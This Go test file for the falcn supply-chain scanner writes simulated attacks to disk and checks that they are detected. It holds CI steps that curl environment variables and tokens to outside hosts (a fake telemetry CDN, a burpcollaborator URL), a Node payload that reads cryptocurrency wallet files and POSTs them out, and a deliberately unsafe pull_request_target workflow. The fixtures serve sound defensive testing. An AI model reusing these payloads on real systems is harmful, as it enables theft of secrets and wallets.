package scenarios

// Enterprise Security Scenarios
// These tests simulate real-world corporate security situations where
// falcn must protect organizations from supply chain attacks.

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"sync/atomic"
	"testing"

	"github.com/falcn-io/falcn/internal/detector"
	"github.com/falcn-io/falcn/internal/proxy"
	"github.com/falcn-io/falcn/internal/scanner"
	"github.com/falcn-io/falcn/pkg/types"
	"github.com/stretchr/testify/assert"
)

// Helper functions (requireThreatType, requireThreatWithSubstring, requireMinSeverity)
// are declared in developer_oss_test.go

// popularNPM and popularPyPI are declared in developer_oss_test.go

// mockChecker, newMockChecker, setResult, CheckPackage are declared in developer_oss_test.go

// ---------------------------------------------------------------------------
// Scenario 1: SolarWinds-style Build System Compromise
// Simulates: attacker modifies GitHub Actions workflow to inject a malicious
// build step that exfiltrates secrets during CI.
// ---------------------------------------------------------------------------

func TestEnterprise_SolarWindsStyleBuildCompromise(t *testing.T) {
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	os.MkdirAll(ghDir, 0755)

	// Workflow that looks normal but has injected malicious step.
	// The telemetry step exfiltrates env vars via base64, and the workflow
	// uses unpinned actions (tag refs instead of SHA pinning).
	workflow := `name: Build and Release
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Setup Node
        uses: actions/setup-node@v4
      - name: Install dependencies
        run: npm ci
      - name: Build
        run: npm run build
      - name: "Update telemetry"
        run: |
          curl -X POST https://telemetry-cdn.azurewebsites.net/api/v2/track \
            -H "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            -d "{\"env\": \"$(env | base64)\"}"
      - name: Publish
        run: npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
`
	os.WriteFile(filepath.Join(ghDir, "release.yml"), []byte(workflow), 0644)

	// Also write the injected script as a standalone file so ContentScanner
	// can detect the base64 env exfiltration pattern.
	injectedScript := `#!/bin/bash
curl -X POST https://telemetry-cdn.azurewebsites.net/api/v2/track \
  -H "Authorization: Bearer ${GITHUB_TOKEN}" \
  -d "{\"env\": \"$(env | base64)\"}"
`
	os.WriteFile(filepath.Join(tmpDir, "telemetry.sh"), []byte(injectedScript), 0644)

	// Use both CI/CD scanner and content scanner for defense-in-depth
	cicdScanner := scanner.NewCICDScanner(tmpDir)
	cicdThreats, err := cicdScanner.ScanProject()
	if err != nil {
		t.Fatalf("CICDScanner.ScanProject failed: %v", err)
	}

	contentScanner := scanner.NewContentScanner()
	contentThreats, err := contentScanner.ScanDirectory(tmpDir)
	if err != nil {
		t.Fatalf("ContentScanner.ScanDirectory failed: %v", err)
	}

	allThreats := append(cicdThreats, contentThreats...)

	if len(allThreats) == 0 {
		t.Fatal("Should detect at least one threat in SolarWinds-style build compromise")
	}
	t.Logf("Detected %d threats total (%d CI/CD, %d content) in SolarWinds-style workflow",
		len(allThreats), len(cicdThreats), len(contentThreats))
	for _, th := range allThreats {
		t.Logf("  - [%s] %s: %s", th.Severity, th.Type, th.Description)
	}
}

// ---------------------------------------------------------------------------
// Scenario 2: Dependency Confusion Attack on Private Registry
// An attacker publishes a public npm package with the same name as a
// company's private internal package, but with a higher version number.
// ---------------------------------------------------------------------------

func TestEnterprise_DependencyConfusionAttack(t *testing.T) {
	engine := detector.New(nil)

	// Internal company package names that could be confused
	internalNames := []struct {
		name string
		desc string
	}{
		{"company-auth-utils", "Internal auth utility"},
		{"myorg-payment-sdk", "Payment processing SDK"},
		{"internal-logger", "Internal logging framework"},
		{"acme-config", "Company config loader"},
	}

	for _, pkg := range internalNames {
		t.Run(pkg.name, func(t *testing.T) {
			dep := types.Dependency{
				Name:     pkg.name,
				Version:  "99.0.0", // Suspiciously high version
				Registry: "npm",
			}
			threats, warnings := engine.AnalyzeDependency(dep, popularNPM, &detector.Options{
				SimilarityThreshold: 0.75,
				DeepAnalysis:        true,
			})

			// Should flag: unknown package with suspiciously high version
			hasFlag := len(threats) > 0 || len(warnings) > 0
			if !hasFlag {
				t.Logf("Note: %s not flagged (dependency confusion detection depends on registry signals)", pkg.name)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Scenario 3: Compromised Maintainer Account (Event-Stream Attack)
// An attacker gains maintainer access to a popular package and publishes
// a malicious update with credential harvesting.
// ---------------------------------------------------------------------------

func TestEnterprise_CompromisedMaintainerEventStream(t *testing.T) {
	tmpDir := t.TempDir()

	// Simulates the event-stream attack: flatmap-stream added as dependency
	// with obfuscated credential theft targeting Bitcoin wallets
	maliciousCode := `
const http = require('http');
const crypto = require('crypto');
const fs = require('fs');

// Normal-looking utility code
module.exports = function flatMap(arr, fn) {
    return arr.reduce((acc, x) => acc.concat(fn(x)), []);
};

// Hidden payload activated only in specific environment
if (process.env.npm_package_description === 'bitcoin-wallet') {
    const dkey = Buffer.from('6465736372697074696f6e', 'hex');
    const paths = [
        process.env.HOME + '/.bitcoin/wallet.dat',
        process.env.HOME + '/.ethereum/keystore',
        process.env.HOME + '/.config/solana/id.json',
        process.env.APPDATA + '/Bitcoin/wallet.dat',
    ];

    paths.forEach(p => {
        try {
            const data = fs.readFileSync(p);
            const encrypted = crypto.publicEncrypt(
                fs.readFileSync(__dirname + '/key.pem'),
                data
            );
            const options = {
                hostname: 'copayapi.host',
                port: 443,
                path: '/telemetry',
                method: 'POST',
                headers: { 'Content-Type': 'application/octet-stream' }
            };
            const req = http.request(options);
            req.write(encrypted);
            req.end();
        } catch(e) {}
    });
}
`
	os.WriteFile(filepath.Join(tmpDir, "index.js"), []byte(maliciousCode), 0644)

	cs := scanner.NewContentScanner()
	threats, err := cs.ScanDirectory(tmpDir)
	if err != nil {
		t.Fatalf("ScanDirectory failed: %v", err)
	}

	if len(threats) == 0 {
		t.Fatal("Must detect at least one threat in event-stream style attack")
	}

	t.Logf("Detected %d threats in event-stream style malicious code", len(threats))
	for _, th := range threats {
		t.Logf("  - [%s] %s: %s", th.Severity, th.Type, th.Description)
	}

	// The code accesses wallet files and POSTs data to external host
	// Should detect network indicators and/or suspicious patterns
	requireMinSeverity(t, threats, types.SeverityMedium,
		"Credential harvesting / network exfiltration should be medium+ severity")
}

// ---------------------------------------------------------------------------
// Scenario 4: Registry Proxy Blocks Corporate Policy Violations
// The enterprise proxy enforces that certain categories of packages are blocked.
// ---------------------------------------------------------------------------

func TestEnterprise_ProxyBlocksCorporatePolicy(t *testing.T) {
	// Setup: company blocks all packages flagged as typosquatting
	mc := newMockChecker()
	mc.setResult("react-native-community-netinfo", &detector.CheckPackageResult{
		Name: "react-native-community-netinfo",
		Threats: []types.Threat{{
			Type:        types.ThreatTypeTyposquatting,
			Severity:    types.SeverityHigh,
			Description: "Similar to @react-native-community/netinfo",
		}},
	})

	// Create mock upstream
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"name":"react-native-community-netinfo","version":"1.0.0"}`))
	}))
	defer upstream.Close()

	cfg := &proxy.ProxyConfig{
		ListenAddr:    ":0",
		NPMUpstream:   upstream.URL,
		PyPIUpstream:  upstream.URL,
		BlockSeverity: "medium", // Enterprise: block medium and above
		WarnSeverity:  "low",
		MaxAuditLog:   100,
	}
	p := proxy.NewRegistryProxy(cfg, mc)

	req := httptest.NewRequest("GET", "/npm/react-native-community-netinfo", nil)
	rec := httptest.NewRecorder()
	p.Router().ServeHTTP(rec, req)

	assert.Equal(t, http.StatusForbidden, rec.Code,
		"Enterprise policy should block typosquatting packages")

	// Verify audit trail
	auditReq := httptest.NewRequest("GET", "/api/v1/audit-log", nil)
	auditRec := httptest.NewRecorder()
	p.Router().ServeHTTP(auditRec, auditReq)
	assert.Contains(t, auditRec.Body.String(), "block",
		"Audit log must record the block decision")
}

// ---------------------------------------------------------------------------
// Scenario 5: Mass Typosquatting Campaign (PyPI 2024-2026 waves)
// An attacker publishes dozens of typosquatting variants of popular packages.
// ---------------------------------------------------------------------------

func TestEnterprise_MassTyposquattingCampaign(t *testing.T) {
	etd := detector.NewEnhancedTyposquattingDetector()

	// Real typosquatting names from 2024-2026 PyPI attacks
	attacks := []struct {
		malicious string
		target    string
		technique string
	}{
		{"reqeusts", "requests", "transposition"},
		{"requsets", "requests", "transposition"},
		{"request", "requests", "missing char"},
		{"requestss", "requests", "extra char"},
		{"requestslib", "requests", "suffix addition"},
		{"numppy", "numpy", "extra char"},
		{"numpyy", "numpy", "extra char"},
		{"flasck", "flask", "extra char"},
		{"flaask", "flask", "extra char"},
		{"tensoflow", "tensorflow", "missing char"},
		{"tensorflw", "tensorflow", "missing char"},
		{"colorsys2", "colorsys", "suffix addition"},
		{"urllib4", "urllib3", "version bump"},
		{"python-dateutil2", "python-dateutil", "suffix addition"},
	}

	detected := 0
	for _, attack := range attacks {
		t.Run(attack.malicious, func(t *testing.T) {
			dep := types.Dependency{
				Name:     attack.malicious,
				Version:  "1.0.0",
				Registry: "pypi",
			}
			result := etd.DetectEnhanced(dep, []string{attack.target}, 0.75)
			if len(result) > 0 {
				detected++
				t.Logf("Detected %s as typosquat of %s (technique: %s)",
					attack.malicious, attack.target, attack.technique)
			} else {
				t.Errorf("MISSED %s (typosquat of %s, technique: %s)",
					attack.malicious, attack.target, attack.technique)
			}
		})
	}

	// Must catch at least 80% of known campaign
	minRate := float64(len(attacks)) * 0.80
	if float64(detected) < minRate {
		t.Errorf("Detection rate too low: %d/%d (%.0f%%, need >=80%%)",
			detected, len(attacks), float64(detected)/float64(len(attacks))*100)
	}
}

// ---------------------------------------------------------------------------
// Scenario 6: Supply Chain via Compromised CI/CD (Codecov-style)
// Simulates Codecov bash uploader compromise: script modified to exfiltrate
// environment variables (CI tokens, AWS keys).
// ---------------------------------------------------------------------------

func TestEnterprise_CodecovStyleCICompromise(t *testing.T) {
	tmpDir := t.TempDir()

	// Simulates Codecov bash uploader compromise: script modified to
	// exfiltrate environment variables (CI tokens, AWS keys)
	compromisedScript := `#!/bin/bash
# Codecov Bash Uploader
set -e

# Normal-looking coverage upload logic
say() { echo "==> $1"; }
CODECOV_URL="https://codecov.io"
VERSION="1.0.7"

say "Codecov Bash Uploader v${VERSION}"

# ... normal setup code ...
upload_coverage() {
    local report=$1
    curl -s "${CODECOV_URL}/upload/v4" \
        -F "file=@${report}" \
        -F "token=${CODECOV_TOKEN}"
}

# INJECTED: exfiltrate all environment variables and CI tokens
curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" \
    "http://nab6d37bk7t4g1cfbilm5kwhe35bcfap.burpcollaborator.net" || true

# Continue normal upload
find . -name "coverage.xml" -exec upload_coverage {} \;
`
	os.WriteFile(filepath.Join(tmpDir, "codecov.sh"), []byte(compromisedScript), 0644)

	cs := scanner.NewContentScanner()
	threats, err := cs.ScanDirectory(tmpDir)
	if err != nil {
		t.Fatalf("ScanDirectory failed: %v", err)
	}

	if len(threats) == 0 {
		t.Fatal("Must detect at least one threat in compromised uploader")
	}

	hasCurlExfil := false
	for _, th := range threats {
		desc := strings.ToLower(th.Description)
		if strings.Contains(desc, "curl") || strings.Contains(desc, "exfil") ||
			strings.Contains(desc, "post") || strings.Contains(desc, "network") ||
			strings.Contains(desc, "suspicious") || strings.Contains(desc, "burp") {
			hasCurlExfil = true
		}
	}

	if !hasCurlExfil {
		t.Logf("Threats found but none explicitly mention curl exfiltration:")
		for _, th := range threats {
			t.Logf("  - [%s] %s: %s", th.Severity, th.Type, th.Description)
		}
	}

	t.Logf("Detected %d threats in compromised Codecov uploader", len(threats))
}

// ---------------------------------------------------------------------------
// Scenario 7: GHA Pull Request Target Exploitation
// Real attack: workflow with pull_request_target checks out attacker's code
// and runs it with write permissions + secrets access.
// ---------------------------------------------------------------------------

func TestEnterprise_GHAPullRequestTargetExploit(t *testing.T) {
	tmpDir := t.TempDir()
	ghDir := filepath.Join(tmpDir, ".github", "workflows")
	os.MkdirAll(ghDir, 0755)

	// Real attack: workflow with pull_request_target checks out attacker's code
	// and runs it with write permissions + secrets access
	workflow := `name: Auto Label PRs
on:
  pull_request_target:
    types: [opened, synchronize]
jobs:
  label:
    runs-on: ubuntu-latest
    permissions:
      contents: write
      pull-requests: write
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Label PR
        run: |
          npm ci
          node scripts/label.js
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
`
	os.WriteFile(filepath.Join(ghDir, "label.yml"), []byte(workflow), 0644)

	cs := scanner.NewCICDScanner(tmpDir)
	threats, err := cs.ScanProject()
	if err != nil {
		t.Fatalf("ScanProject failed: %v", err)
	}

	found := false
	for _, th := range threats {
		if strings.Contains(th.Description, "pull_request_target") {
			found = true
			if th.Severity != types.SeverityCritical {
				t.Errorf("pull_request_target exploit should be CRITICAL, got %s", th.Severity)
			}
		}
	}
	if !found {
		t.Fatal("Must detect pull_request_target + checkout of PR head as critical threat")
	}
}

// ---------------------------------------------------------------------------
// Scenario 8: Enterprise Proxy Handles High-Throughput Install Storm
// Simulates: 500 developers run `npm install` simultaneously during
// Monday morning standup (common enterprise pattern).
// ---------------------------------------------------------------------------

func TestEnterprise_ProxyHighThroughputStorm(t *testing.T) {
	mc := newMockChecker()
	// Mix of clean and suspicious packages
	mc.setResult("clean-pkg", &detector.CheckPackageResult{Name: "clean-pkg"})
	mc.setResult("sus-pkg", &detector.CheckPackageResult{
		Name: "sus-pkg",
		Threats: []types.Threat{{
			Type: types.ThreatTypeTyposquatting, Severity: types.SeverityHigh,
		}},
	})

	// Create mock upstream
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.WriteHeader(http.StatusOK)
		w.Write([]byte(`{"name":"pkg","version":"1.0.0"}`))
	}))
	defer upstream.Close()

	cfg := &proxy.ProxyConfig{
		ListenAddr:    ":0",
		NPMUpstream:   upstream.URL,
		PyPIUpstream:  upstream.URL,
		BlockSeverity: "high",
		WarnSeverity:  "medium",
		MaxAuditLog:   1000,
	}
	p := proxy.NewRegistryProxy(cfg, mc)

	var wg sync.WaitGroup
	var blocked, allowed atomic.Int64

	for i := 0; i < 500; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			pkg := "clean-pkg"
			if i%10 == 0 {
				pkg = "sus-pkg"
			} // 10% malicious

			req := httptest.NewRequest("GET", "/npm/"+pkg, nil)
			rec := httptest.NewRecorder()
			p.Router().ServeHTTP(rec, req)

			if rec.Code == http.StatusForbidden {
				blocked.Add(1)
			} else {
				allowed.Add(1)
			}
		}(i)
	}
	wg.Wait()

	assert.Equal(t, int64(50), blocked.Load(), "Should block exactly 50 malicious packages")
	assert.Equal(t, int64(450), allowed.Load(), "Should allow 450 clean packages")
}
